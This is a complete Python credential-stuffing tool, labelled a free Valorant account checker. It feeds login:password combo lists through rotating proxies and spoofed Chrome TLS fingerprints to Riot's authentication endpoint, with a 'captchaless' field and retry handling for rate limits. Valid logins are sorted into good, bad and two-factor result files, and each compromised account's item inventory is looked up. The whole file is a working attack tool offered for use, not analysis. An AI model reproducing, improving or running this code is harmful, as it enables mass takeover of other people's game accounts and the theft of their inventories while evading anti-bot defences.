
import os
import time
import random
import argparse
import threading
import queue
import tls_client
from tls_client.exceptions import TLSClientExeption
import colorama
colorama.init()

'''
credits:
https://github.com/Henrik-3/unofficial-valorant-api
https://github.com/kingsmurfs

'''
#========== Color
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
MAGENTA = "\033[95m"
CYAN = "\033[96m"
DIM = "\033[2m"      
RESET = "\033[0m"
WHITE = "\033[97m"

#========== Soft name
SOFTWARE_NAME = "kuyoios"
PROJECT_COLOR = WHITE

#========== Global settings
TOTAL = 0
CHECKED = 0
counter_lock = threading.Lock()

def log_print(msg):
    with counter_lock:
        progress = f"[total: {TOTAL} | remaining: {TOTAL - CHECKED}]"
    print(f"{CYAN}{progress} {RESET} {PROJECT_COLOR}[{SOFTWARE_NAME}]{RESET} {msg}")

#=== make dir if not exists
LOG_DIR = "logs"
if not os.path.exists(LOG_DIR):
    os.makedirs(LOG_DIR)

# ========== Utility Functions ==========
def lc_stream(combo_file): #high load generator. format: login:password
   
    
    with open(combo_file, "r", encoding="utf-8") as file:
        for line in file:
            combo = line.strip()
            if combo:
                yield combo

def lp(proxy_file): #proxy socks5://ip:port or http://ip:port
    with open(proxy_file, "r", encoding="utf-8") as file:
        proxies = file.readlines()
    return [proxy.strip() for proxy in proxies]

def format_proxy(ps): #if proxy start with "socks5://", "http://" or "https://", return it, else add http://
    if ps.startswith("socks5://") or ps.startswith("http://") or ps.startswith("https://"):
        return ps
    else:
        return "http://" + ps

def b(): #http request return
    return {
        "client_id": "play-valorant-web-prod",
        "nonce": "1",
        "redirect_uri": "https://playvalorant.com/opt_in",
        "response_type": "token id_token",
        "scope": "openid link ban lol_region locale region",
    }

def bb(username, password): #making request
    return {
        "type": "auth",
        "username": username,
        "password": password,
        "remember": False,
        "language": "en_US",
        "captcha": "hcaptcha ",  # captchaless
    }

# ========== TLS Session ==========
def r(): #making real chrome_120 tls sessiong
    return tls_client.Session(
        client_identifier="chrome_120",
        random_tls_extension_order=True
    )

# ========== Inventory Check ==========
def check_inventory(s, puuid, region): #if good checking inventory from api.henrikdev.xyz
    inv_url = f"https://api.henrikdev.xyz/valorant/v1/inventory?puuid={puuid}&region={region}"
    try:
        inv_resp = s.get(inv_url, timeout=10)
        if inv_resp.ok:
            return inv_resp.json()
    except Exception as e:
        log_print(f"{RED}inventory check error for uid {puuid}: {e}{RESET}")
    return None

def detect_region(s, puuid, regions=None): #detecting region by bruteforce
    if regions is None:
        regions = ["eu", "na", "asia", "kr", "latam", "br"]
    for reg in regions:
        inv_data = check_inventory(s, puuid, reg)
        if inv_data is not None:
            log_print(f"{CYAN}detecting region {reg} for uid {puuid}{RESET}")
            return reg, inv_data
    return None, None

# ========== Response Processing ==========
def process_response(r2_data, combo, s, region): #processing response from PUT-request login. if response == good check inventory elif auth_failure = bad else 2fa
    waiting = 1
    if r2_data:
        if r2_data.get("response"):
            puuid = r2_data.get("puuid")
            inv_data = None
            final_region = region
            if puuid:
                if region.lower() == "auto":
                    final_region, inv_data = detect_region(s, puuid)
                else:
                    inv_data = check_inventory(s, puuid, region)
            log_print(f"{GREEN}hit {combo} | Inventory: {inv_data} | Region: {final_region}{RESET}")
            time.sleep(waiting)
            return "good", inv_data
        elif "error" in r2_data and r2_data["error"] == "auth_failure":
            log_print(f"{RED}bad {combo}{RESET}")
            time.sleep(waiting)
            return "bad", None
        else:
            log_print(f"{YELLOW}2fa {combo} -> {r2_data}{RESET}")
            time.sleep(waiting)
            return "2fa", None
    else:
        log_print(f"{MAGENTA}unknown {combo}{RESET}")
        return "unknown", None

# ========== Worker Function ==========
def worker(combo_queue, proxy_file, region, max_retries):
    proxies = lp(proxy_file)
    blocked = 1
    while True:
        try:
            combo = combo_queue.get_nowait()
        except queue.Empty:
            break
        attempts = 0
        success = False
        while attempts < max_retries and not success:
            try:
                s = r()
                bd = b()
                ps = random.choice(proxies) if proxies else None
                proxy_url = format_proxy(ps) if ps else None
                headers = {"Content-Type": "application/json", "Host": "auth.riotgames.com"}
                url = "https://auth.riotgames.com/api/v1/authorization"

                r1 = s.post(
                    url=url,
                    headers=headers,
                    json=bd,
                    proxy=proxy_url,
                )

                if r1.status_code != 200:
                    log_print(f"{BLUE}{DIM}Rate limit on POST for {combo}{RESET}")
                    time.sleep(blocked)
                    attempts += 1
                    continue

                try:
                    username, password = combo.split(":")
                except Exception as e:
                    log_print(f"{RED}Invalid combo format: {combo}{RESET}")
                    break

                bbd = bb(username, password)
                nh = {"Content-Type": "application/json", "referer": "https://ppk.riotgames.com/"}
                r2 = s.put(
                    url=url,
                    headers=nh,
                    json=bbd,
                    proxy=proxy_url,
                )

                if r2.status_code == 200:
                    r2_data = r2.json()
                    status, inv = process_response(r2_data, combo, s, region)
                    if status == "good":
                        with open(os.path.join(LOG_DIR, "good.txt"), "a", encoding="utf-8") as f:
                            f.write(f"{combo} | Inventory: {inv}\n")
                    elif status == "bad":
                        with open(os.path.join(LOG_DIR, "bad.txt"), "a", encoding="utf-8") as f:
                            f.write(f"{combo}\n")
                    elif status == "2fa":
                        with open(os.path.join(LOG_DIR, "2fa.txt"), "a", encoding="utf-8") as f:
                            f.write(f"{combo} | Response: {r2_data}\n")
                    else:
                        with open(os.path.join(LOG_DIR, "unknown.txt"), "a", encoding="utf-8") as f:
                            f.write(f"{combo} | Response: {r2_data}\n")
                    success = True
                elif r2.status_code == 429:
                    log_print(f"{BLUE}{DIM}Rate limit {combo}{RESET}")
                    time.sleep(blocked)
                    attempts += 1
                    continue
                elif r2.status_code == 498:
                    log_print(f"{RED}Riot block account: {combo}{RESET}")
                    with open(os.path.join(LOG_DIR, "bad.txt"), "a", encoding="utf-8") as f:
                        f.write(f"{combo} | Riot block\n")
                    success = True
                else:
                    log_print(f"{MAGENTA}r2: {r2.status_code} {r2.text}{RESET}")
                    time.sleep(blocked)
                    attempts += 1
                    continue
            except TLSClientExeption as e:
                error_str = str(e)
                # if proxy error, don't touch attempts , else we up it
                if "socks connect tcp" in error_str or "unknown error host unreachable" in error_str:
                    log_print(f"{RED}Proxy error for {combo}: {e}{RESET} - Trying new proxy")
                    continue
                else:
                    log_print(f"{RED}Request error for {combo}: {e}{RESET}")
                    attempts += 1
                    continue
            except Exception as e:
                log_print(f"{RED}Error for {combo}: {e}{RESET}")
                attempts += 1
                continue
        if not success:
            log_print(f"{RED}Max retries reached for {combo}{RESET}")
            with open(os.path.join(LOG_DIR, "bad.txt"), "a", encoding="utf-8") as f:
                f.write(f"{combo} | Max retries reached\n")
        with counter_lock:
            global CHECKED
            CHECKED += 1
        combo_queue.task_done()
    log_print(f"{CYAN}Worker thread finished.{RESET}")

# ========== Main Processing ==========
def process_accounts(combo_file, proxy_file, region, num_threads, max_retries): #processing accounts from file. results in logs folder
    combo_queue = queue.Queue()
    for combo in lc_stream(combo_file):
        combo_queue.put(combo)

    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=worker, args=(combo_queue, proxy_file, region, max_retries))
        t.start()
        threads.append(t)

    combo_queue.join()
    for t in threads:
        t.join()

    log_print(f"{CYAN}All checked, done.{RESET}")

# ========== Main ==========
def main():
    global TOTAL, CHECKED
    parser = argparse.ArgumentParser(description="free valorant account checker by 247bots")
    parser.add_argument("--combo", type=str, default="combo.txt", help="path to combo file")
    parser.add_argument("--proxies", type=str, default="proxies.txt", help="path to proxies file")
    parser.add_argument("--threads", type=int, default=10, help="number of threads to use")
    parser.add_argument("--region", type=str, default="auto", help="region for inventory check (e.g., eu, na, or 'auto')")
    parser.add_argument("--max_retries", type=int, default=3, help="max number of retries per account")
    args = parser.parse_args()

    # calculate combo
    with open(args.combo, "r", encoding="utf-8") as f:
        TOTAL = sum(1 for line in f if line.strip())
    CHECKED = 0

    log_print(f"Processing accounts with {args.threads} threads, max_retries={args.max_retries}, and region '{args.region}'")
    process_accounts(args.combo, args.proxies, args.region, args.threads, args.max_retries)

if __name__ == "__main__":
    import queue 
    main()
